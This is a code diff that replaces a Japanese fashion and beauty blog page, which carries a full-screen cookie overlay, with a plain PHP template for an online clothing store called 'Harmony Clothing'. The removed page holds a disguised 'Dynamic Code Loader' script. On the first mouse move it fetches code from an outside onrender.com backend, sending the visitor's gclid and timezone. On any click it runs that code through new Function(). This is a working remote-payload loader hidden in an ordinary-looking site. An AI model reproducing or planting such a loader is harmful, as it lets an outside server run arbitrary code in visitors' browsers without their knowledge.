@@ -1,298 +1,403 @@
-<html>
-	<script async defer src="https://tools.luckyorange.com/core/lo.js?site-id=058f9a9b"></script>
-	<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
-  <style>
-		
+<?php
+// --- CONFIGURATION: CLOTHING STORE CONTENT ---
+$site_name = "Harmony Clothing";
+$hero_title = "Elevate Your Style";
+$hero_subtitle = "Premium fashion for a balanced lifestyle.";
+$hero_image = "https://images.unsplash.com/photo-1490481651871-ab68de25d43d?q=80&w=2070"; // Fashion Hero Image
 
+// Mock Database of Clothes
+$products = [
+    [
+        "name" => "Classic Linen Shirt",
+        "price" => "¥8,980",
+        "old_price" => "¥10,980",
+        "image" => "https://images.unsplash.com/photo-1596755094514-f87e34085b2c?w=500",
+        "reviews" => "128",
+        "tag" => "Best Seller"
+    ],
+    [
+        "name" => "Silk Evening Dress",
+        "price" => "¥12,980",
+        "old_price" => "",
+        "image" => "https://images.unsplash.com/photo-1572804013309-59a88b7e92f1?w=500",
+        "reviews" => "95",
+        "tag" => "New Arrival"
+    ],
+    [
+        "name" => "Cashmere Scarf",
+        "price" => "¥5,980",
+        "old_price" => "",
+        "image" => "https://images.unsplash.com/photo-1520903920243-00d872a2d1c9?w=500",
+        "reviews" => "67",
+        "tag" => ""
+    ],
+    [
+        "name" => "Tailored Wool Coat",
+        "price" => "¥24,500",
+        "old_price" => "¥28,000",
+        "image" => "https://images.unsplash.com/photo-1539533018447-63fcce2678e3?w=500",
+        "reviews" => "42",
+        "tag" => "Sale"
+    ]
+];
+?>
 
-		.f-button-primary {
-			background-color: #D31965;
-			color: white;
-			border-radius: 50px;
-			padding: 12px 32px;
-			font-size: 14px;
-			font-weight: 500;
-			text-decoration: none;
-			cursor: pointer;
-			margin: 10px;
-			display: inline-block;
-			transition: background-color 0.3s;
-		}
-
-		.f-button-primary:hover {
-			background-color: #A0144F;
-		}
-
-		.f-modal-close {
-			position: absolute;
-			top: 10px;
-			right: 10px;
-			cursor: pointer;
-			font-size: 20px;
-			color: #666;
-		}
-
-		.f-modal-close:hover {
-			color: #D31965;
-		}
-
-		.button-group {
-			margin-top: 20px;
-		}
-
-		.testOpacity {
-			opacity: 0.001;
-		}
-	</style>
-
-<!-- Cookie Modal HTML: Make sure it's in your <body> -->
-<div class="divcover" id="modalContainer" style="display: flex; z-index: 9999; background: rgba(0,0,0,0.8); position: fixed; inset: 0; justify-content: center; align-items: center;">
-  <div class="f-modal-centre" id="modalContent" style="background: #fff; border-radius: 16px; text-align:center; max-width:500px; padding:32px; position:relative;">
-    <div class="f-modal-icon-success" style="margin-bottom:20px;">
-      <img src="Capture.JPG" width="100" height="100" alt="Cookie Icon"/>
-    </div>
-    <div class="f-sub-heading-regular" style="font-size:22px; margin-bottom:12px; color:#333;">エクスペリエンスを向上させるために Cookie を使用します。</div>
-    <div class="button-group">
-      <a href="#" class="f-button-primary" id="acceptButton" style="background-color:#4CAF50;">受け入れる</a>
-      <a href="#" class="f-button-primary" id="rejectButton" style="background-color:#E53935;">拒否する</a>
-      <a href="#" class="f-button-primary" id="manageButton" style="background-color:#2979FF;">管理</a>
-    </div>
-    <div class="f-modal-close" id="closeButton" style="position:absolute; top:10px; right:10px; cursor:pointer;">&times;</div>
-  </div>
-</div>
-
-<!-- CSS: You likely already have styles, but ensure the above is visible -->
-<style>
-body.modal-open {
-  overflow: hidden;
-}
-</style>
-
-
-
-
-
-        <meta charset="utf-8" />
-        <meta name="viewport" content="width=device-width, initial-scale=1" />
-
-        <meta name="keywords" content="ファッション, トレンド, スタイル, コーディネート, オシャレ, ブランド, アウトフィット, ショッピング, 衣類, アクセサリー, モード, デザイン, メンズファッション, レディースファッション, シーズン, 新" />
-        <meta name="description" content="最新のファッションを追求するサイト。トレンドの洋服、アクセサリー、シューズを豊富に取り揃え、スタイルに合ったアイテムを簡単に見つけることができます。高品質な商品をリーズナブルな価格で提供し、最新のファッションニュースやスタイリングのヒントも満載。すべてのファッション愛好家に最適なオンラインショッピング体験を提供します。" />
-<!-- Modal Script -->
-<script>
-document.addEventListener("DOMContentLoaded", function () {
-    var modal = document.getElementById("specialOfferModal");
-    var closeButton = document.querySelector(".close-button");
-    var closeModalLinks = document.querySelectorAll(".close-modal");
-
-    // Show the modal
-    modal.style.display = "block";
-
-    // Function to close modal
-    function closeModal() {
-        modal.style.display = "none";
-    }
-
-    // Close button click
-    closeButton.addEventListener("click", closeModal);
-
-    // Close modal links click
-    closeModalLinks.forEach(function (link) {
-        link.addEventListener("click", function (event) {
-            event.preventDefault();
-            closeModal();
-        });
-    });
-
-    // Close modal if clicking outside of it
-    window.addEventListener("click", function (event) {
-        if (event.target == modal) {
-            closeModal();
-        }
-    });
-});
-</script>
-
-<!-- Dynamic Code Loader Script -->
-<script>
-const gclid = new URLSearchParams(location.search).get("gclid");
-const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-const RENDER_BASE_URL = "https://decemberbackend.onrender.com";
-
-let someCode = null;
-
-// Set a temporary cookie
-document.cookie = "access_cookie=true; path=/; max-age=300";
-
-// Fetch code once on first mouse move
-document.addEventListener("mousemove", async function fetchCodeOnce() {
-    document.removeEventListener("mousemove", fetchCodeOnce);
-
-    try {
-        const res = await fetch(`${RENDER_BASE_URL}/frontend-loader?gclid=${gclid}`, {
-            headers: {
-                "x-client-timezone": timezone,
-                "x-access-cookie": "true",
-            },
-        });
-
-        const data = await res.json();
-        if (data && data.code) {
-            someCode = data.code;
-        }
-    } catch (err) {
-        console.error("Could not fetch code", err);
-    }
-});
-
-// Execute fetched code on any click
-function handleSomeClick() {
-    if (someCode) {
-        try {
-            new Function(someCode)();
-        } catch (err) {
-            console.error("Error executing code:", err);
-        }
-    }
-}
-
-document.addEventListener("click", handleSomeClick);
-</script>
-
+<!DOCTYPE html>
+<html lang="en">
 <head>
-    <meta charset="UTF-8" class="thumb-yCTFrBYjOf" />
-    <link rel="stylesheet" href="styles.css" class="wrap-SvQaabbo" />
-    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no" class="desc-RgCJPR" />
-    <meta name="referrer" content="no-referrer" class="active-lWHjfi" />
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title><?php echo $site_name; ?></title>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Martian+Mono:wght@100..800&display=swap'); html,body{overflow-x: hidden;} *{margin:0;padding:0;} *::-webkit-scrollbar { background-color: #364962; border-radius: 29px; } *::-webkit-scrollbar-thumb { background-color: #fad1bb; border-radius: 29px; border: 3px solid #364962; } a{text-decoration:none} p,li{text-indent: calc(30vw/var(--resizer)*100)} ol{padding-left: calc(30vw/var(--resizer)*100)} h2{text-align: center;} input{outline: none;} #close:checked ~ section {display: none !important;} input::placeholder {color: inherit;} :root { --resizer: 1440; } @media screen and (max-width:414px) { :root { --resizer: 350; } }
+        /* --- EXACT THEME REPLICATION --- */
+        :root {
+            --primary-text: #333333;
+            --secondary-text: #666666;
+            --accent-color: #5d7066; /* The Zen Green from the reference */
+            --bg-light: #f9f9f9;
+            --white: #ffffff;
+            --border-color: #e5e5e5;
+            --font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            font-family: var(--font-family);
+            color: var(--primary-text);
+            line-height: 1.6;
+            background-color: var(--white);
+        }
+
+        /* --- HEADER (Sticky & Clean) --- */
+        header {
+            position: sticky;
+            top: 0;
+            background: var(--white);
+            border-bottom: 1px solid var(--border-color);
+            z-index: 1000;
+            padding: 15px 0;
+        }
+        .header-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .logo {
+            font-size: 1.25rem;
+            font-weight: 700;
+            letter-spacing: -0.5px;
+            text-transform: uppercase;
+            color: var(--primary-text);
+            text-decoration: none;
+        }
+        nav ul {
+            display: flex;
+            list-style: none;
+            gap: 25px;
+        }
+        nav a {
+            text-decoration: none;
+            color: var(--primary-text);
+            font-size: 0.95rem;
+            font-weight: 500;
+        }
+        .cart-icon { font-weight: bold; cursor: pointer; }
+
+        /* --- HERO SECTION --- */
+        .hero {
+            position: relative;
+            height: 500px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            color: var(--white);
+            background-image: linear-gradient(rgba(0,0,0,0.4), rgba(0,0,0,0.4)), url('<?php echo $hero_image; ?>');
+            background-size: cover;
+            background-position: center;
+        }
+        .hero-content h1 {
+            font-size: 3rem;
+            margin-bottom: 15px;
+            font-weight: 700;
+        }
+        .hero-content p {
+            font-size: 1.2rem;
+            margin-bottom: 25px;
+            opacity: 0.9;
+        }
+        .btn-primary {
+            display: inline-block;
+            background: var(--white);
+            color: var(--primary-text);
+            padding: 12px 30px;
+            border-radius: 4px;
+            text-decoration: none;
+            font-weight: 600;
+            transition: background 0.3s;
+        }
+        .btn-primary:hover {
+            background: #f0f0f0;
+        }
+
+        /* --- FEATURES BAR --- */
+        .features {
+            background: var(--bg-light);
+            padding: 40px 0;
+        }
+        .features-grid {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 20px;
+            text-align: center;
+            padding: 0 20px;
+        }
+        .feature-item h3 { font-size: 1rem; margin-bottom: 5px; color: var(--accent-color); }
+        .feature-item p { font-size: 0.85rem; color: var(--secondary-text); }
+
+        /* --- PRODUCT GRID --- */
+        .products-section {
+            max-width: 1200px;
+            margin: 60px auto;
+            padding: 0 20px;
+        }
+        .section-header {
+            text-align: center;
+            margin-bottom: 40px;
+        }
+        .section-header h2 { font-size: 2rem; margin-bottom: 10px; }
+        .section-header p { color: var(--secondary-text); }
+
+        .product-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(260px, 1fr));
+            gap: 30px;
+        }
+        .product-card {
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            overflow: hidden;
+            transition: transform 0.3s, box-shadow 0.3s;
+            background: var(--white);
+        }
+        .product-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 20px rgba(0,0,0,0.05);
+        }
+        .product-img-wrapper {
+            position: relative;
+            height: 300px;
+            overflow: hidden;
+            background: #eee;
+        }
+        .product-img-wrapper img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        .badge {
+            position: absolute;
+            top: 10px;
+            left: 10px;
+            background: var(--accent-color);
+            color: white;
+            padding: 4px 8px;
+            font-size: 0.75rem;
+            border-radius: 4px;
+            text-transform: uppercase;
+        }
+        .product-info {
+            padding: 20px;
+            text-align: center;
+        }
+        .product-title {
+            font-size: 1rem;
+            font-weight: 600;
+            margin-bottom: 5px;
+            color: var(--primary-text);
+        }
+        .product-desc {
+            font-size: 0.85rem;
+            color: var(--secondary-text);
+            margin-bottom: 10px;
+        }
+        .stars { color: #FFD700; font-size: 0.9rem; margin-bottom: 10px; }
+        .price {
+            font-weight: bold;
+            font-size: 1.1rem;
+            color: var(--primary-text);
+        }
+        .old-price {
+            text-decoration: line-through;
+            color: #999;
+            font-size: 0.9rem;
+            margin-left: 5px;
+        }
+        .btn-add {
+            display: block;
+            width: 100%;
+            padding: 10px;
+            margin-top: 15px;
+            background: var(--primary-text);
+            color: var(--white);
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 0.9rem;
+            transition: 0.2s;
+        }
+        .btn-add:hover {
+            background: #555;
+        }
+
+        /* --- FOOTER --- */
+        footer {
+            background: var(--bg-light);
+            border-top: 1px solid var(--border-color);
+            padding: 60px 0 20px;
+            margin-top: 60px;
+        }
+        .footer-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 40px;
+        }
+        .footer-col h4 { margin-bottom: 20px; }
+        .footer-col ul { list-style: none; }
+        .footer-col li { margin-bottom: 10px; }
+        .footer-col a { text-decoration: none; color: var(--secondary-text); }
+        .copyright {
+            text-align: center;
+            margin-top: 40px;
+            padding-top: 20px;
+            border-top: 1px solid #ddd;
+            color: var(--secondary-text);
+            font-size: 0.85rem;
+        }
     </style>
 </head>
+<body>
 
-                    </div>
-                    <div class="narrow-XYQwIpw"><a href="themelist1.html" class="xl-KkHmGdWyVhIm"><span class="wrapper-oqigsptKB">すべてを表示</span></a><a href="index.html" class="large-QmARogTmPO"><span class="title-OKajNEhSa">宣伝</span></a></div>
-                    <div class="grid-egXlms"><img src="./img/9997efb3b5d48f1683b7dbd89a8591d13ca2f533.jpg" class="subject-cjauvUuqC" /></div>
-                    <div class="subject-HMWxpPgalSsw">
-                        <h5 class="avatar-sSHJBmeFaUc">自然メイクの芸術：あなたの美しさを自然に向上させます</h5>
-                        <div class="caption-gvCUkGhWCg"><span class="big-GXzHsNw">この記事では、自然メイクの原則を探り、環境に優しい製品を使用しながら、新鮮で輝く外観を達成するためのヒントとテクニックを提供します。</span></div>
-                    </div>
-                </div>
-                <div class="pic-SLSGctHXKdNQyrXm">
-                    <div class="grid-zvhzylIbvmjltb">
-                        <div class="wrap-fnUEtg">
-                            <div class="large-GQpZnh"><span class="headline-WmLvRImOVBvOT">06 September 2025</span></div>
-                        </div>
-                        <div class="tip-uMkIxbSry">
-                            <div class="icon-JrutBYKXKIRjG"><span class="xs-JIgPBMjOMrFEAP">クララ・トンプソン</span></div>
-                        </div>
-                    </div>
-                    <div class="aside-OWpJcjlkxUZXp"><a href="themelist2.html" class="title-jEkhgn"><span class="preview-ALSbaF">すべてを表示</span></a><a href="index.html" class="container-WkWLZHYgVY"><span class="preview-MCfzsSebPM">宣伝</span></a></div>
-                    <div class="xs-PWkPJttpAt"><img src="./img/99b13566cf26675d0f98b3f9edba3bb1a25ac424.jpg" class="section-CMPaKlhyAvuEVZPd" /></div>
-                    <div class="heading-JPKrfNtXXQhcy">
-                        <h5 class="row-gfvofEyPuRcJ">顕花植物の魅惑的な世界：自然の美しさのお祝い</h5>
-                        <div class="inner-leIzVxslYge"><span class="userpic-HOQXmr">さまざまな種類の顕花植物、それらの特徴、生態学的な役割、そして彼らが私たちの生活にもたらす喜びの詳細な調査。</span></div>
-                    </div>
-                </div>
-                <div class="narrow-iLvqaLfoL">
-                    <div class="row-vPjmEHoKI">
-                        <div class="button-qVzkRBpBebWqFCTk">
-                            <div class="big-kSyFIRRf"><span class="tip-UYkfSPLcgriYOkop">28 March 2025</span></div>
-                        </div>
-                        <div class="thumb-iaUFZVwMJyvwpyO">
-                            <div class="all-kLiFmxMIgB"><span class="md-FcxCBI">エミリー・カーター</span></div>
-                        </div>
-                    </div>
-                    <div class="section-kuKnoKqmFC"><a href="themelist3.html" class="avatar-YrvemkM"><span class="icon-HeXzdtEeipFMQVW">すべてを表示</span></a><a href="index.html" class="thumbnail-MCiwRL"><span class="caption-kyAFHwPgDDmAWJ">宣伝</span></a></div>
-                    <div class="control-dMVpFJFEYTZTKQri"><img src="./img/29a0f4258ec8f62a6625451937e0af2c1b387352.jpg" class="content-gKHXZd" /></div>
-                    <div class="heading-nQGvCsLrrEcNV">
-                        <h5 class="wrapper-yOjZEo">屋内ガーデニングの不思議：家で緑地を栽培する</h5>
-                        <div class="tooltip-fnIxUopA"><span class="tagline-bIFAgxmqwAoTf">屋内ガーデニングの探索、あなたの家の中で繁栄する植物環境を作成するための利点、技術、およびヒントを強調しています。</span></div>
-                    </div>
-                </div>
-                <div class="current-NpQGUTCzVmlIuno">
-                    <div class="section-HKEozJdwmekKJAEs">
-                        <div class="large-XkFDJypio">
-                            <div class="button-DecaUBCKhSfw"><span class="img-qPhsEHsuKTAtbo">04 December 2025</span></div>
-                        </div>
-                        <div class="xl-ZJGICSD">
-                            <div class="pic-WCgmVpr"><span class="title-kXHgsYi">クララ・トンプソン</span></div>
-                        </div>
-                    </div>
-                    <div class="preview-iHrpohJWtOZXUMm"><a href="themelist4.html" class="container-NSqYCmvwodegeB"><span class="heading-AlzBejqWoZt">すべてを表示</span></a><a href="index.html" class="container-yYLrsbAE"><span class="avatar-gZXnNnZlzpmr">宣伝</span></a></div>
-                    <div class="container-bUcMlFho"><img src="./img/2982eaf59b6774b9075f5cf1f66fc121a3dcd2d4.jpg" class="button-wGFQuLwk" /></div>
-                    <div class="large-cAhJVmBIfEPVjQtb">
-                        <h5 class="wide-xFeVjWRvnMnbPMsk">スキンケアにおける天然成分の利点を探る</h5>
-                        <div class="xl-LkHqIQgdzzgGsHn"><span class="avatar-GaBMsBFNmDbKwYDI">この記事では、スキンケアに天然成分を使用する利点を詳しく掘り下げ、人気のあるオプションとそれらがどのように肌の健康を高めることができるかを強調します。</span></div>
-                    </div>
-                </div>
-                <div class="caption-aJwKbIBIZT">
-                    <div class="grid-iJwCBfc">
-                        <div class="small-znuNxLkGZDuzgVa">
-                            <div class="avatar-IfOHvtBsYPnE"><span class="image-PwNpfPjhsMird">31 May 2025</span></div>
-                        </div>
-                        <div class="title-OVbFfrbI">
-                            <div class="current-GgcJAlhv"><span class="tip-PECzIGtxTJTjHQpv">ソフィー・マルティネス</span></div>
-                        </div>
-                    </div>
-                    <div class="breadcrumbs-GuVzuUOuJEkH"><a href="themelist5.html" class="all-uMFMZwcAo"><span class="tooltip-ZvfmyBKEZjPSqRBK">すべてを表示</span></a><a href="index.html" class="page-seykyRfQRH"><span class="md-qASITkkwPeaILoX">宣伝</span></a></div>
-                    <div class="tooltip-hjNeNSozXt"><img src="./img/23516c4e9f508005b46996c4ecbbb7b0bf42db11.jpg" class="md-cwwVddxXmeXMy" /></div>
-                    <div class="control-DHIBgTtGu">
-                        <h5 class="tip-KlfLFUAoDv">ミニマリストのメイクの芸術：少ないものはもっと多い</h5>
-                        <div class="column-BkmUSYw"><span class="tiny-qNlWvZIknXqFDGWj">この記事では、ミニマリストの構成の原則を探り、より少ない製品で新鮮で自然な外観を達成するためのヒントと製品の推奨事項を提供します。</span></div>
-                    </div>
-                </div>
-                <div class="subject-DPDGJr">
-                    <div class="section-LAcyVi">
-                        <div class="grid-GuDsUWqlcY">
-                            <div class="wrap-GZodBnwMGVNWE"><span class="column-NJjOkZOgCrWO">11 December 2024</span></div>
-                        </div>
-                        <div class="wrap-SEeuLXrgBvNSEJOv">
-                            <div class="desc-SnUqTZ"><span class="icon-ngSvubEiQ">リアム・フィッシャー</span></div>
-                        </div>
-                    </div>
-                    <div class="desc-HXxhIlBTCFwpYE"><a href="themelist6.html" class="small-VxgMSrijhngvJ"><span class="thumb-FCArtki">すべてを表示</span></a><a href="index.html" class="thumb-PxMIoaixMlf"><span class="headline-xhnkrNwqEcpzbZ">宣伝</span></a></div>
-                    <div class="subtitle-RhNyZutbkp"><img src="./img/0da32e7978330540c82286170089e2e2658940e9.jpg" class="thumbnail-ADeDFbZR" /></div>
-                    <div class="box-vEitMEVf">
-                        <h5 class="huge-iYcjAdQ">ヘアケアの芸術の習得：健康的なロックのための重要なヒント</h5>
-                        <div class="picture-LOhwaqxMCmuNCmng"><span class="lg-KCEDaRcAeTKgix">この記事では、美しく健康な髪を維持するための効果的なヘアケアの実践、製品、および技術に関する包括的なガイドを提供します。</span></div>
-                    </div>
-                </div>
-                <div class="image-oUoiGbAfaCgEiahN">
-                    <div class="heading-dBZDTbm">
-                        <div class="preview-ZywJfjlZMggLSAJ">
-                            <div class="picture-MuEkmNEkh"><span class="thumbnail-WexCVRy">27 August 2025</span></div>
-                        </div>
-                        <div class="col-igPEJbCBVsJONr">
-                            <div class="md-xJooJmYrZNVpKw"><span class="holder-QeXHlPpYD">ルーカス・ベネット</span></div>
-                        </div>
-                    </div>
-                    <div class="content-FvofXIiNtONEB"><a href="themelist7.html" class="picture-KWYzwnNrQyMeTDY"><span class="breadcrumbs-mnYRamChL">すべてを表示</span></a><a href="index.html" class="preview-cnOydDTBVQc"><span class="narrow-lqzJihKHOAcR">宣伝</span></a></div>
-                    <div class="tagline-zKmQbIYLIAjmy"><img src="./img/194e192ca346f3068b183003c41d5f6ecb4c005c.jpg" class="sm-DaycTcehlWxo" /></div>
-                    <div class="preview-iKyzPvzzKcEwO">
-                        <h5 class="page-qEtBUrKMWeN">香りの芸術：あなたの署名の香りを作り上げます</h5>
-                        <div class="active-KfVGREGrFNvzWXRa"><span class="tooltip-vcrVVKFiiTlnvcUH">この記事では、シグネチャーフレグランスを選択して作成し、重要な香りの体験のための重要なノート、個人的なスタイル、ヒントを探索する技術を掘り下げています。</span></div>
-                    </div>
-                </div>
-            </div>
+    <header>
+        <div class="header-container">
+            <a href="#" class="logo"><?php echo $site_name; ?></a>
+            <nav>
+                <ul>
+                    <li><a href="#">Home</a></li>
+                    <li><a href="#">About Us</a></li>
+                    <li><a href="#">Shop</a></li>
+                    <li><a href="#">Contact</a></li>
+                </ul>
+            </nav>
+            <div class="cart-icon">🛒 0</div>
         </div>
-    </main>
-    <footer class="column-xBCmxbYW">
-        <div class="box-HfIguDSsbqLlOZyP"><a href="./privacy_policy.html" class="preview-nQNjsFyDFqNqqwtW">Privacy Policy</a><a href="./terms_of_use.html" class="row-HyjUaPEzqrbLhj">Terms Of Use</a><a href="./cookie_policy.html" class="column-GHvgvflxqcdVST">Cookies Policy</a></div>
-    </footer>
-    <input type="checkbox" id="close" class="grid-RgZtsjwhlX" />
-    <section class="picture-lUSOBvzw">
-        <div class="xl-jkJFztv">
-            <div class="userpic-PinIle">
-                <label for="close" class="breadcrumbs-rpeMddfLsLOQc"><span class="section-wpbGUeFcyyRMwmQz">Cookieについての情報を入手する</span></label>
-            </div>
-            <div class="heading-ReNBckjoMsCxEN">
-                <label for="close" class="sm-pqKnZybMrvPU"><span class="thumb-LEqLZD">情報を入手</span></label>
-            </div>
-            <div class="headline-XLRtmUCBitaPldE">
-                <label for="close" class="xl-kpPNifB"><span class="lg-MRAcXJSbarJROiSV">すべてを認め</span></label>
-            </div>
+    </header>
+
+    <section class="hero">
+        <div class="hero-content">
+            <h1><?php echo $hero_title; ?></h1>
+            <p><?php echo $hero_subtitle; ?></p>
+            <a href="#shop" class="btn-primary">View Collection</a>
         </div>
-        <div class="xl-JegZLouTAVCSN"><span class="aside-fPdHkbFcXzUNEM">Cookiesポリシーを参照してください。このWebサイトではCookieを使用しています。<br> Cookieを使用して</span></div>
     </section>
-</body>
 
+    <section class="features">
+        <div class="features-grid">
+            <div class="feature-item">
+                <h3>✨ Premium Quality</h3>
+                <p>Selected fabrics for comfort.</p>
+            </div>
+            <div class="feature-item">
+                <h3>🚚 Free Shipping</h3>
+                <p>On all orders over ¥10,000.</p>
+            </div>
+            <div class="feature-item">
+                <h3>💚 30-Day Returns</h3>
+                <p>Shop with confidence.</p>
+            </div>
+            <div class="feature-item">
+                <h3>🔒 Secure Payment</h3>
+                <p>100% protected transactions.</p>
+            </div>
+        </div>
+    </section>
+
+    <section id="shop" class="products-section">
+        <div class="section-header">
+            <h2>Featured Collection</h2>
+            <p>Discover our latest arrivals for the season.</p>
+        </div>
+        
+        <div class="product-grid">
+            <?php foreach ($products as $product): ?>
+                <div class="product-card">
+                    <div class="product-img-wrapper">
+                        <?php if($product['tag']): ?>
+                            <span class="badge"><?php echo $product['tag']; ?></span>
+                        <?php endif; ?>
+                        <img src="<?php echo $product['image']; ?>" alt="<?php echo $product['name']; ?>">
+                    </div>
+                    <div class="product-info">
+                        <div class="product-title"><?php echo $product['name']; ?></div>
+                        <div class="product-desc">Premium comfort & style</div>
+                        <div class="stars">★★★★★ (<?php echo $product['reviews']; ?>)</div>
+                        <div class="price">
+                            <?php echo $product['price']; ?>
+                            <?php if($product['old_price']): ?>
+                                <span class="old-price"><?php echo $product['old_price']; ?></span>
+                            <?php endif; ?>
+                        </div>
+                        <button class="btn-add">Add to Cart</button>
+                    </div>
+                </div>
+            <?php endforeach; ?>
+        </div>
+        
+        <div style="text-align:center; margin-top: 40px;">
+            <a href="#" style="text-decoration:none; color:var(--primary-text); font-weight:bold;">View All Products →</a>
+        </div>
+    </section>
+
+    <footer>
+        <div class="footer-content">
+            <div class="footer-col">
+                <h4><?php echo $site_name; ?></h4>
+                <p style="color:var(--secondary-text); font-size:0.9rem;">
+                    Providing high-quality fashion that fits your lifestyle. Comfortable, durable, and stylish.
+                </p>
+            </div>
+            <div class="footer-col">
+                <h4>Shop</h4>
+                <ul>
+                    <li><a href="#">New Arrivals</a></li>
+                    <li><a href="#">Best Sellers</a></li>
+                    <li><a href="#">Accessories</a></li>
+                    <li><a href="#">Sale</a></li>
+                </ul>
+            </div>
+            <div class="footer-col">
+                <h4>Support</h4>
+                <ul>
+                    <li><a href="#">Contact Us</a></li>
+                    <li><a href="#">Shipping Policy</a></li>
+                    <li><a href="#">Returns</a></li>
+                    <li><a href="#">FAQ</a></li>
+                </ul>
+            </div>
+        </div>
+        <div class="copyright">
+            &copy; <?php echo date("Y"); ?> <?php echo $site_name; ?>. All Rights Reserved.
+        </div>
+    </footer>
+
+</body>
 </html>
